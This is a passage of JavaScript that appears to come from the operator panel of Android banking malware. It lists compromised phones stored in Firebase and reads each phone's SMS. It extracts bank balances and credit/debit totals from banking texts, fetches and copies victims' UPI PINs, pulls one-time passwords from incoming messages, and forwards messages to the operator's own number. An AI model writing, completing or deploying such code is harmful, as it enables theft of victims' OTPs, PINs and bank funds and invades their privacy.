  if(!FB_URL)return;
  if(userConfig.forwardEnabled===false||!userConfig.myNumber)return;
  var dev=null;
  if(activeDeviceUid){var parts=activeDeviceUid.split('|||');dev=allDevices.find(function(x){return x.id===parts[1]&&(x._fbId||'primary')===parts[0];});}
  if(!dev)dev=allDevices.find(function(d){return d.status;});
  if(!dev||!dev.status)return;
  var uid=(dev._fbId||'primary')+'|||'+dev.id;
  if(_msgStreamUid===uid&&_msgStream&&_msgStream.readyState===1)return;
  try{
    var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY,auth=fbKey?'?auth='+fbKey+'&':'?';
    var r=await fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=20',{signal:AbortSignal.timeout(4000)});
    if(!r.ok)return;
    var msgs=parseMsgs(await r.json());
    if(msgs.length)checkAndForward(msgs,dev.id);
  }catch(e){}
}

/* ═══════ DEVICE LOADING ═══════ */
async function loadDevs(){
  document.getElementById('deviceGrid').innerHTML='<div class="ldwrap" style="grid-column:1/-1"><div class="gold-spin"></div> Loading devices...</div>';
  try{
    var data=await fbGet('clients');var primDevs=parseDevs(data);
    primDevs.forEach(function(d){d._fbId='primary';d._fbLabel='Primary';d._fbUrl=FB_URL;d._fbKey=FB_KEY;if(noteC[d.id]===undefined)noteC[d.id]=d.note||'';});
    if(fbInstances.length>0){fbMergeAll();}else{allDevices=applyStableOrder(primDevs);renderStats();renderGrid(true);}
  }catch(e){document.getElementById('deviceGrid').innerHTML='<div class="empty" style="grid-column:1/-1"><div class="ei">⚠️</div><p>Failed to load devices</p></div>';}
}
function applyStableOrder(devs){
  if(!Array.isArray(devs)||!devs.length)return devs;
  var orderMap={};try{orderMap=JSON.parse(localStorage.getItem('fbi_device_order')||'{}');}catch(e){}
  var max=0;Object.keys(orderMap).forEach(function(k){var v=parseInt(orderMap[k],10);if(v>max)max=v;});
  devs.forEach(function(d){var num=parseInt(orderMap[d.id],10);if(isNaN(num)){max+=1;num=max;orderMap[d.id]=num;}d.deviceOrder=num;});
  devs.sort(function(a,b){return(a.deviceOrder||0)-(b.deviceOrder||0);});
  try{localStorage.setItem('fbi_device_order',JSON.stringify(orderMap));}catch(e){}
  return devs;
}
function parseDT(dt){if(!dt)return 0;var s=String(dt).trim();if(/^\d{10,13}$/.test(s))return parseInt(s.length===13?s:s+'000');var m=s.match(/(\d{1,2})[\-\/\.](\d{1,2})[\-\/\.](\d{4}).*?(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(am|pm)?/i);if(m){var h=+m[4],mn=+m[5],sc=+(m[6]||0),ap=(m[7]||'').toLowerCase();if(ap==='pm'&&h<12)h+=12;if(ap==='am'&&h===12)h=0;return new Date(+m[3],+m[2]-1,+m[1],h,mn,sc).getTime();}var d=new Date(s);return isNaN(d.getTime())?0:d.getTime();}
function parseBatt(v){if(v==null)return NaN;return parseInt(String(v).replace('%','').trim());}
function fmtPh(n){if(!n)return'—';var s=String(n).replace(/\D/g,'');if(s.startsWith('91')&&s.length===12)return'+'+s;if(s.length===10)return'+91'+s;if(s.length>0)return'+'+s;return'—';}
function parseDevs(data){
  var devs=[];
  if(data&&typeof data==='object'){
    Object.entries(data).forEach(function(kv){
      var id=kv[0],d=kv[1];if(!d||typeof d!=='object')return;
      var sims=Array.isArray(d.sims)?d.sims:(d.sims&&typeof d.sims==='object'?Object.values(d.sims):[]);
      var jTs=parseDT(d.joined||d.createdAt||d.timestamp||'')||0;
      var mob=fmtPh(d.mobNo||(sims[0]&&(sims[0].phoneNumber||'')||''));
      var upipin=(d.upipin&&String(d.upipin).trim())||null;
      devs.push({id:id,fbKey:id,name:d.modelName||d.model||d.deviceName||id,batteryRaw:d.battery!=null?d.battery:'—',batteryNum:parseBatt(d.battery),status:!!d.status,mobNo:mob,ip:d.ip_address||'—',android:d.androidV||'—',storage:d.storage||'—',note:d.note||'',joined:d.joined||'—',jTs:jTs,sdkV:d.sdkV||'—',cpuArch:d.cpu_arch||'—',isRoot:!!d.isRoot,isSdCard:!!d.isSdCard,serviceProvider:d.service_provider||'',upipin:upipin,sims:sims});
    });
  }
  return devs;
}

/* ═══════ STATS ═══════ */
var _sc={tot:0,on:0,off:0,sims:0,upi:0};
function _rebuildSC(){var on=0,off=0,sims=0,upi=0;for(var i=0;i<allDevices.length;i++){var d=allDevices[i];if(d.status)on++;else off++;sims+=d.sims.length;if(d.upipin||pinC[d.id])upi++;}_sc={tot:allDevices.length,on:on,off:off,sims:sims,upi:upi};}
function renderStats(){_rebuildSC();document.getElementById('tpTot').textContent=_sc.tot+' total';document.getElementById('tpOn').textContent=_sc.on+' online';document.getElementById('tpOff').textContent=_sc.off+' offline';}

/* ═══════ DEVICE SEARCH ═══════ */
function deviceMatchesSearch(d,query){
  if(!query)return true;
  var q=query.toLowerCase().trim();if(!q)return true;
  var bal=deviceBalances[d.id];
  var hay=[d.name||'',d.id||'',d.mobNo||'',(d.mobNo||'').replace(/\+/g,''),(d.mobNo||'').replace(/\D/g,''),d.ip||'',d.note||'',noteC[d.id]||'',d.serviceProvider||'',d.upipin||'',pinC[d.id]||'',(d.sims||[]).map(function(s){return(s.phoneNumber||'')+' '+(s.phone||'');}).join(' '),bal?(bal.bank+' '+bal.amount):'',bal?String(bal.amount):'',d.status?'online':'offline'].join(' ').toLowerCase();
  return hay.indexOf(q)!==-1;
}
function setDeviceSearch(v){deviceSearchQuery=v||'';renderGrid(true);}
function clearDeviceSearch(){var el=document.getElementById('deviceSearch');if(el)el.value='';deviceSearchQuery='';renderGrid(true);}

/* ═══════ GRID — NO BLINK (structural sig only) ═══════ */
function _computeGridSig(filtered){
  var parts=[deviceSearchQuery||''];
  for(var i=0;i<filtered.length;i++){
    var d=filtered[i];
    var uid=(d._fbId||'primary')+'|||'+d.id;
    /* 🆕 only STRUCTURAL fields — not status/battery/balance */
    parts.push(uid+'|'+(d.deviceOrder||i)+'|'+(d.name||'')+'|'+(d.mobNo||'')+'|'+(d.note||noteC[d.id]||'')+'|'+(d.serviceProvider||''));
  }
  return filtered.length+'##'+parts.join('##');
}

/* 🆕 Update a single card without re-render */
function updateCardNoBlink(devId){
  var d=allDevices.find(function(x){return x.id===devId;});
  if(!d)return;
  var uid=(d._fbId||'primary')+'|||'+d.id;
  var card=document.querySelector('.device-card[data-uid="'+CSS.escape(uid)+'"]');
  if(!card)return;
  /* Update status */
  var isOn=d.status;
  card.classList.toggle('online',isOn);
  var dot=card.querySelector('.dc-icon .dot');
  if(dot){dot.classList.toggle('on',isOn);dot.classList.toggle('off',!isOn);}
  var stVals=card.querySelectorAll('.dc-stat-val');
  if(stVals[2]){stVals[2].textContent=isOn?'ON':'OFF';stVals[2].style.color=isOn?'var(--mint)':'var(--dim)';}
  /* Battery */
  if(stVals[0]){
    var bv=d.batteryNum;
    var bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';
    stVals[0].textContent=isNaN(bv)?d.batteryRaw:bv+'%';stVals[0].style.color=bc;
  }
  /* Balance */
  var bal=deviceBalances[d.id];
  var balEl=card.querySelector('.dc-balance');
  if(balEl){
    if(bal){
      balEl.classList.remove('empty');
      balEl.innerHTML='<div class="dc-bal-lbl">💰 Balance</div><div class="dc-bal-bank">'+esc(bal.bank)+'</div><div class="dc-bal-val" data-copy="'+esc(String(bal.amount))+'" onclick="copyFromEl(this,event)">'+fmtBal(bal.amount)+'</div>';
    }
  }
}

function renderGrid(force){
  var grid=document.getElementById('deviceGrid');
  var filtered=allDevices.filter(function(d){
    if(gridFilter==='online'&&!d.status)return false;
    if(gridFilter==='offline'&&d.status)return false;
    if(gridFilter==='pin'&&!d.upipin&&!pinC[d.id])return false;
    if(gridFilter==='balance'&&!deviceBalances[d.id])return false;
    if(!deviceMatchesSearch(d,deviceSearchQuery))return false;
    return true;
  });

  if(!filtered.length){
    var emptyMsg=deviceSearchQuery?'<p>No devices match "'+esc(deviceSearchQuery)+'"</p>':'<p>No devices match this filter</p>';
    var emptySig='__EMPTY__'+(deviceSearchQuery||'');
    if(_lastGridSig!==emptySig){
      grid.innerHTML='<div class="empty" style="grid-column:1/-1"><div class="ei">📵</div>'+emptyMsg+'</div>';
      _lastGridSig=emptySig;_cardRefs={};
    }
    return;
  }

  var sig=_computeGridSig(filtered);
  if(!force && sig===_lastGridSig)return;
  _lastGridSig=sig;
  _cardRefs={};

  var html='';
  filtered.forEach(function(d,i){
    var uid=(d._fbId||'primary')+'|||'+d.id;
    var isActive=(activeDeviceUid===uid);
    var bv=d.batteryNum;
    var bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';
    var num=d.mobNo!=='—'?d.mobNo:(d.sims[0]?fmtPh(d.sims[0].phoneNumber||''):'—');
    var note=noteC[d.id]||d.note||'';
    var used=!!usedDevices[d.id];
    var emo=d.name.toLowerCase().includes('iphone')?'🍎':d.name.toLowerCase().includes('samsung')?'📱':'📲';
    var bal=deviceBalances[d.id];
    var balHtml=bal?'<div class="dc-balance"><div class="dc-bal-lbl">💰 Balance</div><div class="dc-bal-bank">'+esc(bal.bank)+'</div><div class="dc-bal-val" data-copy="'+esc(String(bal.amount))+'" onclick="copyFromEl(this,event)">'+fmtBal(bal.amount)+'</div></div>':'<div class="dc-balance empty"><div class="dc-bal-lbl">💰 Balance</div><div class="dc-bal-val">—</div></div>';
    html+='<div class="device-card '+(d.status?'online':'')+' '+(isActive?'active':'')+'" data-uid="'+esc(uid)+'" onclick="openDeviceModal(\''+esc(uid)+'\')" style="animation-delay:0s">'
      +'<div class="dc-top"><div class="dc-icon">'+emo+'<div class="dot '+(d.status?'on':'off')+'"></div></div>'
      +'<div class="dc-meta"><div class="dc-name">'+esc(d.name)+'</div><div class="dc-id">#'+(d.deviceOrder||(i+1))+' · '+esc(d.id.substring(0,14))+'…</div></div>'
      +(isActive?'<div class="dc-active-pill">ACTIVE</div>':'')+'</div>'
      +'<div class="dc-stats">'
        +'<div class="dc-stat"><div class="dc-stat-lbl">Battery</div><div class="dc-stat-val" style="color:'+bc+'">'+(isNaN(bv)?d.batteryRaw:bv+'%')+'</div></div>'
        +'<div class="dc-stat"><div class="dc-stat-lbl">SIMs</div><div class="dc-stat-val" style="color:var(--gold2)">'+d.sims.length+'</div></div>'
        +'<div class="dc-stat"><div class="dc-stat-lbl">State</div><div class="dc-stat-val" style="color:'+(d.status?'var(--mint)':'var(--dim)')+';font-size:11px">'+(d.status?'ON':'OFF')+'</div></div>'
      +'</div>'
      +'<div class="dc-num" data-copy="'+esc(num)+'" onclick="copyFromEl(this,event)">'+esc(num)+'</div>'
      +balHtml
      +(note?'<div class="dc-note">📝 '+esc(note)+'</div>':'')
      +'<div class="dc-footer"><div class="dc-badges">'
        +(d.upipin||pinC[d.id]?'<span class="dc-badge pin">💳 PIN</span>':'')
        +(used?'<span class="dc-badge used">✓ Used</span>':'')
        +(d.serviceProvider?'<span class="dc-badge sim">'+esc(d.serviceProvider)+'</span>':'')
      +'</div><div class="dc-conn">#'+(d.deviceOrder||(i+1))+'</div></div></div>';
  });
  grid.innerHTML=html;
}
function toggleFilterMenu(e){if(e)e.stopPropagation();document.getElementById('filterMenu').classList.toggle('open');}
function setGridFilter(f){gridFilter=f;var labels={all:'All',online:'Online',offline:'Offline',pin:'PIN',balance:'Balance'};document.getElementById('filterLabel').textContent=labels[f]||'All';document.querySelectorAll('.filter-menu > div').forEach(function(el){el.classList.toggle('active',el.dataset.f===f);});document.getElementById('filterMenu').classList.remove('open');renderGrid(true);}
document.addEventListener('click',function(e){var menu=document.getElementById('filterMenu');if(menu&&!e.target.closest('.filter-wrap'))menu.classList.remove('open');});

/* ═══════ DEVICE MODAL ═══════ */
function openDeviceModal(uid){
  var parts=uid.split('|||');
  var d=allDevices.find(function(x){return x.id===parts[1]&&(x._fbId||'primary')===parts[0];});
  if(!d)d=allDevices.find(function(x){return x.id===parts[1];});
  if(!d){toast('⚠ Device not found');return;}
  selDev=d;activeDeviceUid=uid;
  try{localStorage.setItem(CFG.LS_ACTIVE||'fbi_active_device',uid);}catch(e){}
  savePanelSession();  /* 🆕 */
  renderGrid(true);
  document.getElementById('deviceModal').classList.add('open');
  refreshDeviceModal();
  var cacheKey=uid,cached=_msgCache[cacheKey];
  if(cached){allMsgs=cached;lastKeys=new Set(cached.map(function(m){return m.key;}));updCnt();filterActiveMsgs();renderBankPane();_silentRefresh(selDev);}
  else{document.getElementById('dmMsgList').innerHTML='<div class="ldwrap"><div class="gold-spin"></div> Loading…</div>';allMsgs=[];lastKeys=new Set();preloadMsgs(selDev.id);}
  updOtpNoteBox();
  setTimeout(function(){var toInp=document.getElementById('dmSendTo');if(toInp&&!toInp.value&&userConfig.myNumber)toInp.value=userConfig.myNumber;},100);
}
function refreshDeviceModal(){
  if(!selDev)return;
  var d=selDev;
  document.getElementById('dmName').textContent=d.name;
  document.getElementById('dmSub').textContent='#'+(d.deviceOrder||'—')+' · '+d.id;
  var bv=d.batteryNum,bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';
  var bp=isNaN(bv)?0:Math.min(100,Math.max(0,bv)),bd=isNaN(bv)?d.batteryRaw:bv+'%';
  document.getElementById('dmHero').innerHTML='<div class="dm-hero-batt"><div class="dm-hero-batt-num" style="color:'+bc+'">'+bd+'</div><div class="dm-hero-batt-lbl">Battery</div></div>'
    +'<div class="dm-hero-batt-bar"><div class="dm-hero-batt-fill" style="width:'+bp+'%;background:'+bc+'"></div></div>'
    +'<div class="dm-hero-status"><span style="background:'+(d.status?'rgba(6,214,160,.14)':'rgba(244,63,94,.1)')+';color:'+(d.status?'var(--mint)':'var(--rose)')+'">'+(d.status?'● ONLINE':'● OFFLINE')+'</span>'
    +(d.serviceProvider?'<span style="background:rgba(56,189,248,.12);color:var(--sky)">'+esc(d.serviceProvider)+'</span>':'')
    +(d.isRoot?'<span style="background:rgba(168,85,247,.14);color:var(--gold2)">⚡ Root</span>':'')+'</div>';
  var bal=deviceBalances[d.id];
  var balHero=document.getElementById('dmBalHero');
  if(bal){balHero.className='dm-bal-hero';balHero.innerHTML='<div class="dm-bal-hero-lbl">💰 Latest Balance Detected</div><div class="dm-bal-hero-val" data-copy="'+esc(String(bal.amount))+'" onclick="copyFromEl(this,event)">'+fmtBal(bal.amount)+'</div><div class="dm-bal-hero-sub"><b>🏦 '+esc(bal.bank)+'</b> · '+esc(bal.sender||'—')+(bal.ts?' · '+new Date(bal.ts).toLocaleString():'')+'</div>';}
  else{balHero.className='dm-bal-hero empty';balHero.innerHTML='<div class="dm-bal-hero-lbl">💰 Latest Balance</div><div class="dm-bal-hero-val">No banking SMS found yet</div>';}
  document.getElementById('dmSim1').textContent=d.sims[0]?fmtPh(d.sims[0].phoneNumber||d.sims[0].phone||''):'No SIM';
  document.getElementById('dmSim2').textContent=d.sims[1]?fmtPh(d.sims[1].phoneNumber||d.sims[1].phone||''):'No SIM';
  var curSim=deviceSimMap[d.id]||1;
  document.querySelectorAll('#dmSimSelect .sim-opt').forEach(function(el){el.classList.toggle('active',parseInt(el.dataset.sim)===curSim);});
  document.querySelectorAll('#dmPane-send .stb').forEach(function(el,i){el.className='stb'+(i+1===curSim?(i+1===1?' s1':' s2'):'');});
  document.getElementById('dmNoteInp').value=noteC[d.id]||d.note||'';
  document.getElementById('dmInfo').innerHTML=
    '<div class="ic"><div class="ic-l">Phone</div><div class="ic-v" data-copy="'+esc(d.mobNo)+'" onclick="copyFromEl(this,event)">'+esc(d.mobNo)+'</div></div>'
    +'<div class="ic"><div class="ic-l">IP</div><div class="ic-v mono" data-copy="'+esc(d.ip)+'" onclick="copyFromEl(this,event)">'+esc(d.ip)+'</div></div>'
    +'<div class="ic"><div class="ic-l">Storage</div><div class="ic-v">'+esc(String(d.storage))+'</div></div>'
    +'<div class="ic"><div class="ic-l">Android</div><div class="ic-v">'+esc(d.android)+'</div></div>'
    +'<div class="ic"><div class="ic-l">SDK</div><div class="ic-v">'+esc(d.sdkV)+'</div></div>'
    +'<div class="ic"><div class="ic-l">CPU</div><div class="ic-v">'+esc(d.cpuArch)+'</div></div>'
    +'<div class="ic"><div class="ic-l">Joined</div><div class="ic-v" style="font-size:11px">'+esc(String(d.joined).slice(0,20))+'</div></div>'
    +'<div class="ic"><div class="ic-l">Firebase</div><div class="ic-v mono" style="font-size:9px">'+esc((d._fbUrl||FB_URL).substring(0,40))+'</div></div>';
  document.getElementById('dmSendDisp').innerHTML='<div style="width:9px;height:9px;border-radius:50%;background:'+(d.status?'var(--mint)':'var(--dim)')+(d.status?';box-shadow:0 0 7px var(--mint)':'')+'"></div><div style="flex:1;min-width:0"><div class="dd-name">'+esc(d.name)+'</div><div class="dd-id" data-copy="'+esc(d.id)+'" onclick="copyFromEl(this,event)">'+esc(d.id)+'</div></div>';
  loadPinActive();renderBankPane();
}
function dmSwitchTab(tab){document.querySelectorAll('.dm-tab').forEach(function(t){t.classList.toggle('active',t.dataset.tab===tab);});document.querySelectorAll('.dm-tab-pane').forEach(function(p){p.classList.remove('active');});document.getElementById('dmPane-'+tab).classList.add('active');if(tab==='bank')renderBankPane();}
function setActiveSim(sim){if(!selDev)return;deviceSimMap[selDev.id]=sim;saveDeviceSims();refreshDeviceModal();toast('✓ SIM '+sim+' active');}
function saveNoteActive(){if(!selDev)return;var val=document.getElementById('dmNoteInp').value.trim();fbSet('clients/'+selDev.id+'/note',val||null,selDev._fbUrl,selDev._fbKey).then(function(){noteC[selDev.id]=val;selDev.note=val;toast('📝 Note saved');renderGrid(true);}).catch(function(){toast('⚠ Failed');});}
function confDelActive(){if(!selDev)return;document.getElementById('confT').textContent='Delete Device?';document.getElementById('confM').textContent='Delete "'+selDev.name+'"?';document.getElementById('confOk').onclick=async function(){closeM('confirmModal');try{await fbDel('clients/'+selDev.id,selDev._fbUrl,selDev._fbKey);toast('✓ Deleted');closeM('deviceModal');loadDevs();}catch(e){toast('⚠ Failed');}};openM('confirmModal');}

/* ═══════ BALANCE ═══════ */
function extractBalanceFromText(txt){
  if(!txt)return null;
  var pats=[/(?:Avl\.?\s*Bal|AvlBal|Available\s*Bal|Avail\.?\s*Bal|Avbl\s*Bal)\s*:?\s*(?:Rs\.?:?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,/(?:Ledger|Book|Closing)\s*Bal(?:ance)?\s*:?\s*(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,/CLR\s*BAL\s*([0-9,]+(?:\.[0-9]{1,2})?)\s*CR/i,/Bal\s*(?:\(incl[^)]*\))?\s*(?:Rs\.?|INR)\.?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,/balance(?:\s*is)?\s*(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,/\bBal[\s:]+(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i];
  for(var i=0;i<pats.length;i++){var m=txt.match(pats[i]);if(m){var v=parseFloat(m[1].replace(/,/g,''));if(!isNaN(v))return v;}}
  return null;
}
function extractLastBalance(msgs){
  if(!msgs||!msgs.length)return null;
  for(var i=0;i<msgs.length;i++){
    var m=msgs[i];if(m.type&&m.type!=='incoming')continue;
    var bank=detectBank(m.sender);if(!bank)continue;
    var txt=String(m.message||''),lower=txt.toLowerCase();
    var isPromo=false;for(var p=0;p<BANK_PROMO_KEYWORDS.length;p++){if(lower.indexOf(BANK_PROMO_KEYWORDS[p])!==-1){isPromo=true;break;}}
    var hasBal=false,hasTxn=false;
    for(var b=0;b<BANK_BAL_KEYWORDS.length;b++){if(lower.indexOf(BANK_BAL_KEYWORDS[b])!==-1){hasBal=true;break;}}
    for(var t=0;t<BANK_TXN_KEYWORDS.length;t++){if(lower.indexOf(BANK_TXN_KEYWORDS[t])!==-1){hasTxn=true;break;}}
    if(isPromo&&!hasBal&&!hasTxn)continue;
    if(!hasBal&&!hasTxn)continue;
    var amt=extractBalanceFromText(txt);
    if(amt!=null)return{amount:amt,bank:bank.name,sender:m.sender,ts:m._ts||0,msg:m.message||''};
  }
  return null;
}
function fmtBal(n){return '\u20B9'+Number(n).toLocaleString('en-IN',{maximumFractionDigits:2});}
function startBalancePoll(){stopBalancePoll();balPoll=setInterval(balanceTick,POLL_BAL);setTimeout(balanceTick,800);}
function stopBalancePoll(){if(balPoll){clearInterval(balPoll);balPoll=null;}}
async function balanceTick(){
  if(!FB_URL||_balTickRunning)return;_balTickRunning=true;
  try{
    var online=allDevices.filter(function(d){return d.status;});
    var BATCH=12;
    for(var i=0;i<online.length;i+=BATCH){
      await Promise.allSettled(online.slice(i,i+BATCH).map(async function(dev){
        try{
          var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY,auth=fbKey?'?auth='+fbKey+'&':'?';
          var r=await fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=30',{signal:AbortSignal.timeout(4000)});
          if(!r.ok)return;
          var bal=extractLastBalance(parseMsgs(await r.json()));
          if(bal)deviceBalances[dev.id]=bal;
        }catch(e){}
      }));
    }
    try{localStorage.setItem('fbi_device_balances',JSON.stringify(deviceBalances));}catch(e){}
    /* 🆕 no-blink update instead of full render */
    online.forEach(function(d){updateCardNoBlink(d.id);});
    if(selDev)refreshDeviceModal();
  }finally{_balTickRunning=false;}
}

/* ═══════ BANKING PANE ═══════ */
function renderBankPane(){
  var el=document.getElementById('dmBankPane');if(!el||!selDev)return;
  var bankMsgs=allMsgs.filter(function(m){if(m.type!=='incoming')return false;return !!isBankingSms(m.sender,m.message);});
  if(!bankMsgs.length){el.innerHTML='<div class="empty"><div class="ei">🏦</div><p>No banking SMS detected on this device</p></div>';return;}
  var cr=0,dr=0,cards='';
  bankMsgs.forEach(function(m){
    var bank=detectBank(m.sender),txt=String(m.message||''),amts=[];
    var re=/(?:Rs\.?\s*|INR\.?\s*|\u20B9\s*)([0-9,]+(?:\.[0-9]{1,2})?)/gi,match;
    while((match=re.exec(txt))!==null){var v=parseFloat(match[1].replace(/,/g,''));if(!isNaN(v)&&v>0)amts.push(v);}
    var amt=amts.length?amts[0]:0;
    var isCr=/credited|credit\b|received|deposited|refund/i.test(txt)&&!/debit/i.test(txt);
    var isDr=/debited|debit\b|spent|withdrawn/i.test(txt)&&!/credit/i.test(txt);
    if(isCr)cr+=amt;if(isDr)dr+=amt;
    var amtBadge=(amt>0&&(isCr||isDr))?'<span class="bank-card-amt '+(isCr?'bank-cr':'bank-dr')+'">'+(isCr?'+':'-')+fmtBal(amt)+'</span>':'';
    cards+='<div class="bank-card"><div class="bank-card-top">'+(bank?'<span class="bank-card-name">🏦 '+esc(bank.name)+'</span>':'')+'<span class="msg-sndr" style="font-size:10px;color:var(--sky)" data-copy="'+esc(m.sender)+'" onclick="copyFromEl(this,event)">'+esc(m.sender)+'</span>'+amtBadge+'<span class="bank-card-ts">'+esc(m.dateTime||'')+'</span></div><div class="bank-card-txt" data-copy="'+esc(m.message)+'" onclick="copyFromEl(this,event)">'+esc(m.message)+'</div></div>';
  });
  el.innerHTML='<div class="bank-summary"><div class="bank-sum"><div class="bank-sum-l">Total Credit</div><div class="bank-sum-v" style="color:var(--mint)">'+fmtBal(cr)+'</div></div><div class="bank-sum"><div class="bank-sum-l">Total Debit</div><div class="bank-sum-v" style="color:var(--rose)">'+fmtBal(dr)+'</div></div><div class="bank-sum"><div class="bank-sum-l">Count</div><div class="bank-sum-v" style="color:var(--gold2)">'+bankMsgs.length+'</div></div></div><div class="bank-list">'+cards+'</div>';
}

/* ═══════ PIN ═══════ */
async function getPin(id){
  var dev=allDevices.find(function(d){return d.id===id;});
  var u=dev&&dev._fbUrl||FB_URL,k=dev&&dev._fbKey!==undefined?dev._fbKey:FB_KEY;
  try{var auth=k?'?auth='+k:'';var r=await fetch(u+'/clients/'+id+'/upipin.json'+auth,{signal:AbortSignal.timeout(4000)});var val=await r.json();
    if(val===null||val===undefined||val===false||val==='')return null;
    if(typeof val==='string'&&val.trim())return val.trim();
    if(typeof val==='number')return String(val);return null;
  }catch(e){return null;}
}
async function loadPinActive(){
  if(!selDev)return;
  var pv=document.getElementById('dmPinVal'),pt=document.getElementById('dmPinToggle'),pcp=document.getElementById('dmPinCopy');
  if(!pv)return;
  var raw=selDev.upipin||pinC[selDev.id];
  if(!raw){raw=await getPin(selDev.id);pinC[selDev.id]=raw;}
  if(raw){var display=String(raw).split('|')[0].trim();pv.className='pin-digits blurred';pv.textContent=display;pv.setAttribute('data-copy',display);pv.setAttribute('onclick','copyFromEl(this,event)');pinV[selDev.id]=false;if(pt)pt.style.display='';pt.textContent='Show';if(pcp)pcp.style.display='';}
  else{pv.className='pin-digits loading';pv.textContent='Not found';}
}
function togPinActive(){if(!selDev)return;var id=selDev.id;pinV[id]=!pinV[id];var v=document.getElementById('dmPinVal');var b=document.getElementById('dmPinToggle');if(v)v.classList.toggle('blurred',!pinV[id]);if(b)b.textContent=pinV[id]?'Hide':'Show';}
function copyPinActive(){if(!selDev)return;var v=document.getElementById('dmPinVal');if(!v||v.classList.contains('loading'))return;copyFromEl(v);}

/* ═══════ MESSAGES ═══════ */
function parseMsgs(data){
  var msgs=[];if(!data)return msgs;
  var entries=Array.isArray(data)?data.map(function(v,i){return[String(i),v];}):Object.entries(data);
  entries.forEach(function(kv){var p=parseMsgSingle(kv[0],kv[1]);if(p)msgs.push(p);});
  msgs.sort(function(a,b){if(a._ts>0&&b._ts>0)return b._ts-a._ts;return String(b.key).localeCompare(String(a.key));});
  return msgs;
}
async function preloadMsgs(id){
  if(!selDev)return;
  var cacheKey=(selDev._fbId||'primary')+'|||'+id;
  var fbUrl=selDev._fbUrl||FB_URL,fbKey=selDev._fbKey!==undefined?selDev._fbKey:FB_KEY;
  try{
    var auth=fbKey?'?auth='+fbKey+'&':'?';
    var r=await fetch(fbUrl+'/messages/'+id+'.json'+auth+'orderBy="$key"&limitToLast=200',{signal:AbortSignal.timeout(6000)});
    if(!r.ok)throw new Error('HTTP '+r.status);
    var msgs=parseMsgs(await r.json());
    _msgCache[cacheKey]=msgs;amCache[id]=msgs;amFetch[id]=Date.now();
    if(selDev&&selDev.id===id){allMsgs=msgs;lastKeys=new Set(msgs.map(function(m){return m.key;}));updCnt();filterActiveMsgs();renderBankPane();checkAndForward(msgs,id);}
    startMP(id);
  }catch(e){document.getElementById('dmMsgList').innerHTML='<div class="empty"><div class="ei">⚠️</div><p>Failed</p></div>';startMP(id);}
}
async function pollMsgs(id){
  if(!selDev||selDev.id!==id)return;
  var dev=selDev,cacheKey=(dev._fbId||'primary')+'|||'+id;
  var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY;
  try{
    var auth=fbKey?'?auth='+fbKey+'&':'?';
    var r=await fetch(fbUrl+'/messages/'+id+'.json'+auth+'orderBy="$key"&limitToLast=200',{signal:AbortSignal.timeout(4000)});
    if(!r.ok)return;
    var msgs=parseMsgs(await r.json());
    var hasNew=msgs.some(function(m){return !lastKeys.has(m.key);});
    lastKeys=new Set(msgs.map(function(m){return m.key;}));
    _msgCache[cacheKey]=msgs;amCache[id]=msgs;amFetch[id]=Date.now();
    if(hasNew){
      allMsgs=msgs;updCnt();filterActiveMsgs();renderBankPane();
      var lm=msgs[0];if(lm){var otp=_extractOtp(lm.message);if(otp&&otp!==_lastOtp)otpShow(otp,lm.sender);}
      checkAndForward(msgs,id);
    } else if(allMsgs.length!==msgs.length){allMsgs=msgs;updCnt();filterActiveMsgs();renderBankPane();}
  }catch(e){}
}
function _silentRefresh(dev){
  var cacheKey=(dev._fbId||'primary')+'|||'+dev.id;
  var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY,auth=fbKey?'?auth='+fbKey+'&':'?';
  fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=200',{signal:AbortSignal.timeout(4000)}).then(function(r){return r.json();}).then(function(data){
    var msgs=parseMsgs(data);
    _msgCache[cacheKey]=msgs;
    if(selDev&&selDev.id===dev.id){allMsgs=msgs;lastKeys=new Set(msgs.map(function(m){return m.key;}));updCnt();filterActiveMsgs();renderBankPane();}
    if(!forwardTracker[dev.id]&&msgs.length){forwardTracker[dev.id]=msgs[0].key;saveForwardTracker();}
    startMP(dev.id);
  }).catch(function(){startMP(dev.id);});
}
function updCnt(){var el=document.getElementById('dmMsgCnt');if(el)el.textContent=allMsgs.length+' msgs';}
function filterActiveMsgs(){
  var q=(document.getElementById('dmMsgSearch').value||'').toLowerCase().trim();
  var list=allMsgs.filter(function(m){
    if(mfMode==='incoming'&&m.type!=='incoming')return false;
    if(mfMode==='outgoing'&&m.type!=='outgoing')return false;
    if(mfMode==='bank'&&!isBankingSms(m.sender,m.message))return false;
    if(q){var bank=detectBank(m.sender);var hay=(m.message+' '+m.sender+' '+(m.dateTime||'')+' '+(bank?bank.name:'')).toLowerCase();if(hay.indexOf(q)===-1)return false;}
    return true;
  });
  var el=document.getElementById('dmMsgList');
  if(!list.length){el.innerHTML='<div class="empty"><div class="ei">💬</div><p>No messages</p></div>';return;}
  el.innerHTML=list.map(function(m){
    var bankTag=detectBank(m.sender);var isBank=!!isBankingSms(m.sender,m.message);var hp=isHighPriority(m);
    var cls=m.type==='incoming'?'inc':'out';if(isBank)cls+=' bank';if(hp)cls+=' hp';
